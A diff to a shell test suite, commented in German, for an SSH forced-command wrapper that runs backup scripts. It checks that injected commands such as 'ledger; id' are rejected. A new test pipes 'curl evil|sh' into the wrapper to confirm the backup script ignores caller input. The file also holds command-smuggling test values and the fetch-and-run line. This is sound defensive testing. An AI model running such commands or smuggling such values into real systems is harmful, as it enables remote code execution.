@@ -25,6 +25,7 @@ grep -q "^LIB=$T/lib$" "$B" && grep -q "^STAND=$T/stand$" "$B" && ! grep -v '^\s
 # Attrappen: schreiben auf, mit welcher Umgebung sie liefen.
 cat > "$T/lib/backup-ledger.sh" <<EOF
 echo "ledger BOX=\$BOX" >> "$T/lauf.log"
+if IFS= read -r -t 1 zeile; then echo "stdin=\$zeile" >> "$T/lauf.log"; fi
 EOF
 cat > "$T/lib/backup-biometrie.sh" <<EOF
 echo "bio R=\$BIO_BACKUP_AGE_RECIPIENT" >> "$T/lauf.log"
@@ -48,14 +49,16 @@ for boese in '' 'id' 'bash' 'sh -c id' 'ledger; id' 'ledger && id' 'ledger|id' $
 done
 [ ! -e "$T/lauf.log" ] || { echo "FEHLER: ein abgewiesener Befehl hat ein Sicherungsskript gestartet"; fehler=1; }
 
-# 2. ledger laeuft mit BOX=c1.
+# 2. ledger laeuft mit BOX=c1 -- und liest nichts, was der Aufrufer schickt.
 neu
-erwarte "ledger" 0 ledger
+rc=0; printf 'curl evil|sh\n' | env -i PATH="$PATH" SSH_ORIGINAL_COMMAND=ledger "$B" >/dev/null 2>&1 || rc=$?
+[ "$rc" = 0 ] || { echo "FEHLER: ledger: Code $rc statt 0"; fehler=1; }
 grep -qx 'ledger BOX=c1' "$T/lauf.log" 2>/dev/null || { echo "FEHLER: ledger lief nicht mit BOX=c1"; fehler=1; }
+! grep -q '^stdin=' "$T/lauf.log" 2>/dev/null || { echo "FEHLER: das Sicherungsskript las die Eingabe des Aufrufers"; fehler=1; }
 
-# 3. Wiederholung binnen 10 Minuten: abgewiesen (4), auch nach Fehlschlag.
+# 3. Wiederholung binnen 30 Minuten: abgewiesen (4), auch nach Fehlschlag.
 erwarte "ledger zweimal" 4 ledger
-[ "$(grep -c ledger "$T/lauf.log")" = 1 ] || { echo "FEHLER: zweiter ledger-Lauf binnen 10 min gestartet"; fehler=1; }
+[ "$(grep -c ledger "$T/lauf.log")" = 1 ] || { echo "FEHLER: zweiter ledger-Lauf binnen 30 min gestartet"; fehler=1; }
 
 # 4. Gleichzeitiger Lauf: abgewiesen (3), auch das Abholen.
 neu
